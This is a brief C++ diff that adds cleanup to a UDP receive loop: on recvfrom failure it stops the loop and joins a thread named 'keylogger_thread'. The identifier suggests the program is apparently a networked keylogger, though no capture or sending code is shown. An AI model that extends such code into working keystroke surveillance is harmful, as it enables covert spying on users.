@@ -178,6 +178,11 @@ int main(int argc, char **argv) {
             int n = recvfrom(clientFD, buffer, sizeof(buffer), 0, (struct sockaddr *)&recvAddr, &addrLen);
             if (n < 0) {
                 std::cerr << "recvfrom failed, closing connection.\n";
+                running = false;
+
+                if (keylogger_thread.joinable()) {
+                    keylogger_thread.join();
+                }
                 break;  // Exit the loop or handle the error
             }
             buffer[n] = '\0';
